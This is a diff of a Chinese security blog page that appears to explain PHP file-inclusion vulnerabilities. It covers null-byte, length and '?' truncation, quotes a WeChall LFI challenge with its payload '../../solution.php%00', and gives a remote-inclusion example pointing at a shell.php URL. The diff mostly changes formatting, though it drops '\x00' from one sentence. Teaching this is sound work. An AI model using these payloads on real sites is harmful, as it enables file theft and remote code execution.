@@ -78,7 +78,7 @@
 <link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="Penlab" />
 
 
 
@@ -94,12 +94,12 @@
 
 
 
-<meta name="description" content="0x01 文件包含漏洞 include()、include_once()、require()、require_once()均有可能造成文件包含漏洞，其中前两者在遇到错误时仍会向下执行，而后两者在报错后直接退出程序。 当执行者四个函数时，可无视文件类型，直接当作php脚本来执行。(只要能让php 解析器识别出来是php代码文本就成)。  文件包含截断 有些包含可能文件路径里设置了前后缀不可控，这时">
+<meta name="description" content="0x01 文件包含漏洞 include()、include_once()、require()、require_once()均有可能造成文件包含漏洞，其中前两者在遇到错误时仍会向下执行，而后两者在报错后直接退出程序。 当执行者四个函数时，可无视文件类型，直接当作php脚本来执行。(只要能让php 解析器识别出来是php代码文本就成)。 文件包含截断 有些包含可能文件路径里设置了前后缀不可控，这时候需">
 <meta property="og:type" content="article">
 <meta property="og:title" content="PHP文件操作漏洞总结">
 <meta property="og:url" content="http://example.com/2019/11/08/php_file_vul/index.html">
 <meta property="og:site_name" content="Penlab">
-<meta property="og:description" content="0x01 文件包含漏洞 include()、include_once()、require()、require_once()均有可能造成文件包含漏洞，其中前两者在遇到错误时仍会向下执行，而后两者在报错后直接退出程序。 当执行者四个函数时，可无视文件类型，直接当作php脚本来执行。(只要能让php 解析器识别出来是php代码文本就成)。  文件包含截断 有些包含可能文件路径里设置了前后缀不可控，这时">
+<meta property="og:description" content="0x01 文件包含漏洞 include()、include_once()、require()、require_once()均有可能造成文件包含漏洞，其中前两者在遇到错误时仍会向下执行，而后两者在报错后直接退出程序。 当执行者四个函数时，可无视文件类型，直接当作php脚本来执行。(只要能让php 解析器识别出来是php代码文本就成)。 文件包含截断 有些包含可能文件路径里设置了前后缀不可控，这时候需">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2019-11-07T16:00:00.000Z">
 <meta property="article:modified_time" content="2022-03-30T06:25:22.787Z">
@@ -331,13 +331,13 @@
       
 
       
-        <h1 id="0x01-文件包含漏洞"><a class="markdownIt-Anchor" href="#0x01-文件包含漏洞"></a> 0x01 文件包含漏洞</h1>
+        <h1 id="x01-文件包含漏洞">0x01 文件包含漏洞</h1>
 <p><code>include()</code>、<code>include_once()</code>、<code>require()</code>、<code>require_once()</code>均有可能造成文件包含漏洞，其中前两者在遇到错误时仍会向下执行，而后两者在报错后直接退出程序。</p>
 <p>当执行者四个函数时，可无视文件类型，直接当作php脚本来执行。(只要能让php 解析器识别出来是php代码文本就成)。</p>
-<h2 id="文件包含截断"><a class="markdownIt-Anchor" href="#文件包含截断"></a> 文件包含截断</h2>
+<h2 id="文件包含截断">文件包含截断</h2>
 <p>有些包含可能文件路径里设置了前后缀不可控，这时候需要截断。其中前缀主要采用url编码,绕过对<code>../</code>的限制，后缀主要采用截断的方式。</p>
-<h2 id="00截断"><a class="markdownIt-Anchor" href="#00截断"></a> 00截断</h2>
-<p>(C语言中一些字符串处理时，用0字节(\x00)作为字符串结束符？)</p>
+<h2 id="截断">00截断</h2>
+<p>(C语言中一些字符串处理时，用0字节()作为字符串结束符？)</p>
 <p>00截断需要满足两个条件：</p>
 <ul>
 <li>php版本小于5.3.4</li>
@@ -345,18 +345,18 @@
 </ul>
 <p>如wechall上的<a target="_blank" rel="noopener" href="http://www.wechall.net/challenge/training/php/lfi/up/index.php">这道LFI</a>，</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###############################</span></span><br><span class="line"><span class="comment">### Here is your exploit :) ###</span></span><br><span class="line"><span class="comment">###############################</span></span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;$filename = \&#x27;pages/\&#x27;.(isset($_GET[&quot;file&quot;])?$_GET[&quot;file&quot;]:&quot;welcome&quot;).\&#x27;.html\&#x27;;&#x27;</span>;</span><br><span class="line"><span class="variable">$code_emulate_pnb</span> = <span class="string">&#x27;$filename = Common::substrUntil($filename, &quot;\\0&quot;);&#x27;</span>; <span class="comment"># Emulate Poison Null Byte for PHP&gt;=5.3.4</span></span><br><span class="line"><span class="variable">$code2</span> = <span class="string">&#x27;include $filename;&#x27;</span>;</span><br><span class="line"><span class="comment">### End of exploit ###</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">lfiIsSafeDir</span>(<span class="variable">$filename</span>) === <span class="literal">true</span>) &#123; <span class="keyword">eval</span>(<span class="variable">$code2</span>); &#125; <span class="comment"># Eval the second line, when safe.</span></span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lfiIsSafeDir</span>(<span class="params"><span class="variable">$filename</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="variable">$valid</span> = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;pages&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;pages/../..&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;pages/..&#x27;</span>,</span><br><span class="line">        );</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">in_array</span>(<span class="variable">$d</span>, <span class="variable">$valid</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>虽然我觉得这并不是一个太好的例子…这里比较奇葩，在$filename=pages/[可控].html，soultion.php和index.php差了一层，然而构造的时候内部又拼接了一层<code>pages</code>所以payload:</p>
+<p>虽然我觉得这并不是一个太好的例子...这里比较奇葩，在$filename=pages/[可控].html，soultion.php和index.php差了一层，然而构造的时候内部又拼接了一层<code>pages</code>所以payload:</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../solution.php%00</span><br></pre></td></tr></table></figure>
-<h2 id="截断"><a class="markdownIt-Anchor" href="#截断"></a> ./截断</h2>
-<p>&quot;.&quot;或者 &quot;/&quot;截断，在一定的长度时将被截断。win系统和nix</p>
+<h2 id="截断-1">./截断</h2>
+<p>"."或者 "/"截断，在一定的长度时将被截断。win系统和nix</p>
 <ul>
 <li>目录字符串， windows下256个字节，Linux下4096个字节回答道最大值。最大长度之后的字符将被丢弃。</li>
 </ul>
-<h2 id="伪截断"><a class="markdownIt-Anchor" href="#伪截断"></a> 伪截断</h2>
-<p>远程包含里，URL里&quot;?“或者”#&quot;号后为参数不为资源一部分。如提交“action=http://www.penlab.me/shell.php?”，这里的“？”实现了伪截断。</p>
+<h2 id="伪截断">伪截断</h2>
+<p>远程包含里，URL里"?"或者"#"号后为参数不为资源一部分。如提交“action=http://www.penlab.me/shell.php?”，这里的“？”实现了伪截断。</p>
 <hr />
-<h2 id="0x02-总结"><a class="markdownIt-Anchor" href="#0x02-总结"></a> 0x02 总结</h2>
-<p>文件包含拿的是“脚本”，文件读取拿的是“数据”，因此不具有执行权。如果统一看作&quot;资源&quot;，那么这些资源又可以分为远程和本地，其中本地资源通过路径来访问，而远程的需要使用URL来访问之。远程文件包含需要开启<code>allow_url_include = On</code>（&gt;=5.2 Off）和<code>allow_url_fopen=On</code>(默认On)。</p>
+<h2 id="x02-总结">0x02 总结</h2>
+<p>文件包含拿的是“脚本”，文件读取拿的是“数据”，因此不具有执行权。如果统一看作"资源"，那么这些资源又可以分为远程和本地，其中本地资源通过路径来访问，而远程的需要使用URL来访问之。远程文件包含需要开启<code>allow_url_include = On</code>（&gt;=5.2 Off）和<code>allow_url_fopen=On</code>(默认On)。</p>
 
       
     </div>
@@ -518,7 +518,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text"> 0x01 文件包含漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%88%AA%E6%96%AD"><span class="nav-number">1.1.</span> <span class="nav-text"> 文件包含截断</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#00%E6%88%AA%E6%96%AD"><span class="nav-number">1.2.</span> <span class="nav-text"> 00截断</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%88%AA%E6%96%AD"><span class="nav-number">1.3.</span> <span class="nav-text"> .&#x2F;截断</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BC%AA%E6%88%AA%E6%96%AD"><span class="nav-number">1.4.</span> <span class="nav-text"> 伪截断</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E6%80%BB%E7%BB%93"><span class="nav-number">1.5.</span> <span class="nav-text"> 0x02 总结</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#x01-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">0x01 文件包含漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%88%AA%E6%96%AD"><span class="nav-number">1.1.</span> <span class="nav-text">文件包含截断</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%88%AA%E6%96%AD"><span class="nav-number">1.2.</span> <span class="nav-text">00截断</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%88%AA%E6%96%AD-1"><span class="nav-number">1.3.</span> <span class="nav-text">.&#x2F;截断</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BC%AA%E6%88%AA%E6%96%AD"><span class="nav-number">1.4.</span> <span class="nav-text">伪截断</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#x02-%E6%80%BB%E7%BB%93"><span class="nav-number">1.5.</span> <span class="nav-text">0x02 总结</span></a></li></ol></li></ol></div>
             
 
           </div>
